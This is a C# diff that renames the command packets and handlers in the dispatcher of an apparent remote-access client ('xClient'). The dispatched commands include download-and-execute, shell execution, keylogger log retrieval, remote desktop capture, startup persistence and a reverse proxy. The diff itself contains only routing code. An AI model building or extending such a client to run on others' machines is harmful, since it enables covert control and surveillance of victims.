@@ -10,119 +10,119 @@ namespace xClient.Core.Packets
         {
             var type = packet.GetType();
 
-            if (type == typeof(ServerPackets.InitializeCommand))
+            if (type == typeof(ServerPackets.GetAuthentication))
             {
-                CommandHandler.HandleInitializeCommand((ServerPackets.InitializeCommand)packet, client);
+                CommandHandler.HandleGetAuthentication((ServerPackets.GetAuthentication)packet, client);
             }
-            else if (type == typeof(ServerPackets.DownloadAndExecute))
+            else if (type == typeof(ServerPackets.DoDownloadAndExecute))
             {
-                CommandHandler.HandleDownloadAndExecuteCommand((ServerPackets.DownloadAndExecute)packet,
+                CommandHandler.HandleDoDownloadAndExecute((ServerPackets.DoDownloadAndExecute)packet,
                     client);
             }
-            else if (type == typeof(ServerPackets.UploadAndExecute))
+            else if (type == typeof(ServerPackets.DoUploadAndExecute))
             {
-                CommandHandler.HandleUploadAndExecute((ServerPackets.UploadAndExecute)packet, client);
+                CommandHandler.HandleDoUploadAndExecute((ServerPackets.DoUploadAndExecute)packet, client);
             }
-            else if (type == typeof(ServerPackets.Disconnect))
+            else if (type == typeof(ServerPackets.DoClientDisconnect))
             {
                 Program.Disconnect();
             }
-            else if (type == typeof(ServerPackets.Reconnect))
+            else if (type == typeof(ServerPackets.DoClientReconnect))
             {
                 Program.Disconnect(true);
             }
-            else if (type == typeof(ServerPackets.Uninstall))
+            else if (type == typeof(ServerPackets.DoClientUninstall))
             {
-                CommandHandler.HandleUninstall((ServerPackets.Uninstall)packet, client);
+                CommandHandler.HandleDoClientUninstall((ServerPackets.DoClientUninstall)packet, client);
             }
-            else if (type == typeof(ServerPackets.Desktop))
+            else if (type == typeof(ServerPackets.GetDesktop))
             {
-                CommandHandler.HandleRemoteDesktop((ServerPackets.Desktop)packet, client);
+                CommandHandler.HandleGetDesktop((ServerPackets.GetDesktop)packet, client);
             }
             else if (type == typeof(ServerPackets.GetProcesses))
             {
                 CommandHandler.HandleGetProcesses((ServerPackets.GetProcesses)packet, client);
             }
-            else if (type == typeof(ServerPackets.KillProcess))
+            else if (type == typeof(ServerPackets.DoProcessKill))
             {
-                CommandHandler.HandleKillProcess((ServerPackets.KillProcess)packet, client);
+                CommandHandler.HandleDoProcessKill((ServerPackets.DoProcessKill)packet, client);
             }
-            else if (type == typeof(ServerPackets.StartProcess))
+            else if (type == typeof(ServerPackets.DoProcessStart))
             {
-                CommandHandler.HandleStartProcess((ServerPackets.StartProcess)packet, client);
+                CommandHandler.HandleDoProcessStart((ServerPackets.DoProcessStart)packet, client);
             }
-            else if (type == typeof(ServerPackets.Drives))
+            else if (type == typeof(ServerPackets.GetDrives))
             {
-                CommandHandler.HandleDrives((ServerPackets.Drives)packet, client);
+                CommandHandler.HandleGetDrives((ServerPackets.GetDrives)packet, client);
             }
-            else if (type == typeof(ServerPackets.Directory))
+            else if (type == typeof(ServerPackets.GetDirectory))
             {
-                CommandHandler.HandleDirectory((ServerPackets.Directory)packet, client);
+                CommandHandler.HandleGetDirectory((ServerPackets.GetDirectory)packet, client);
             }
-            else if (type == typeof(ServerPackets.DownloadFile))
+            else if (type == typeof(ServerPackets.DoDownloadFile))
             {
-                CommandHandler.HandleDownloadFile((ServerPackets.DownloadFile)packet, client);
+                CommandHandler.HandleDoDownloadFile((ServerPackets.DoDownloadFile)packet, client);
             }
-            else if (type == typeof(ServerPackets.MouseClick))
+            else if (type == typeof(ServerPackets.DoMouseClick))
             {
-                CommandHandler.HandleMouseClick((ServerPackets.MouseClick)packet, client);
+                CommandHandler.HandleDoMouseClick((ServerPackets.DoMouseClick)packet, client);
             }
             else if (type == typeof(ServerPackets.GetSystemInfo))
             {
                 CommandHandler.HandleGetSystemInfo((ServerPackets.GetSystemInfo)packet, client);
             }
-            else if (type == typeof(ServerPackets.VisitWebsite))
+            else if (type == typeof(ServerPackets.DoVisitWebsite))
             {
-                CommandHandler.HandleVisitWebsite((ServerPackets.VisitWebsite)packet, client);
+                CommandHandler.HandleDoVisitWebsite((ServerPackets.DoVisitWebsite)packet, client);
             }
-            else if (type == typeof(ServerPackets.ShowMessageBox))
+            else if (type == typeof(ServerPackets.DoShowMessageBox))
             {
-                CommandHandler.HandleShowMessageBox((ServerPackets.ShowMessageBox)packet, client);
+                CommandHandler.HandleDoShowMessageBox((ServerPackets.DoShowMessageBox)packet, client);
             }
-            else if (type == typeof(ServerPackets.Update))
+            else if (type == typeof(ServerPackets.DoClientUpdate))
             {
-                CommandHandler.HandleUpdate((ServerPackets.Update)packet, client);
+                CommandHandler.HandleDoClientUpdate((ServerPackets.DoClientUpdate)packet, client);
             }
-            else if (type == typeof(ServerPackets.Monitors))
+            else if (type == typeof(ServerPackets.GetMonitors))
             {
-                CommandHandler.HandleMonitors((ServerPackets.Monitors)packet, client);
+                CommandHandler.HandleGetMonitors((ServerPackets.GetMonitors)packet, client);
             }
-            else if (type == typeof(ServerPackets.ShellCommand))
+            else if (type == typeof(ServerPackets.DoShellExecute))
             {
-                CommandHandler.HandleShellCommand((ServerPackets.ShellCommand)packet, client);
+                CommandHandler.HandleDoShellExecute((ServerPackets.DoShellExecute)packet, client);
             }
-            else if (type == typeof(ServerPackets.Rename))
+            else if (type == typeof(ServerPackets.DoPathRename))
             {
-                CommandHandler.HandleRename((ServerPackets.Rename)packet, client);
+                CommandHandler.HandleDoPathRename((ServerPackets.DoPathRename)packet, client);
             }
-            else if (type == typeof(ServerPackets.Delete))
+            else if (type == typeof(ServerPackets.DoPathDelete))
             {
-                CommandHandler.HandleDelete((ServerPackets.Delete)packet, client);
+                CommandHandler.HandleDoPathDelete((ServerPackets.DoPathDelete)packet, client);
             }
-            else if (type == typeof(ServerPackets.Action))
+            else if (type == typeof(ServerPackets.DoShutdownAction))
             {
-                CommandHandler.HandleAction((ServerPackets.Action)packet, client);
+                CommandHandler.HandleDoShutdownAction((ServerPackets.DoShutdownAction)packet, client);
             }
             else if (type == typeof(ServerPackets.GetStartupItems))
             {
                 CommandHandler.HandleGetStartupItems((ServerPackets.GetStartupItems)packet, client);
             }
-            else if (type == typeof(ServerPackets.AddStartupItem))
+            else if (type == typeof(ServerPackets.DoStartupItemAdd))
             {
-                CommandHandler.HandleAddStartupItem((ServerPackets.AddStartupItem)packet, client);
+                CommandHandler.HandleDoStartupItemAdd((ServerPackets.DoStartupItemAdd)packet, client);
             }
-            else if (type == typeof(ServerPackets.RemoveStartupItem))
+            else if (type == typeof(ServerPackets.DoStartupItemRemove))
             {
-                CommandHandler.HandleAddRemoveStartupItem((ServerPackets.RemoveStartupItem)packet, client);
+                CommandHandler.HandleDoStartupItemRemove((ServerPackets.DoStartupItemRemove)packet, client);
             }
-            else if (type == typeof(ServerPackets.DownloadFileCanceled))
+            else if (type == typeof(ServerPackets.DoDownloadFileCancel))
             {
-                CommandHandler.HandleDownloadFileCanceled((ServerPackets.DownloadFileCanceled)packet,
+                CommandHandler.HandleDoDownloadFileCancel((ServerPackets.DoDownloadFileCancel)packet,
                     client);
             }
-            else if (type == typeof(ServerPackets.GetLogs))
+            else if (type == typeof(ServerPackets.GetKeyloggerLogs))
             {
-                CommandHandler.HandleGetLogs((ServerPackets.GetLogs)packet, client);
+                CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs)packet, client);
             }
             else if (type == typeof(ReverseProxy.Packets.ReverseProxyConnect) ||
                      type == typeof(ReverseProxy.Packets.ReverseProxyConnectResponse) ||
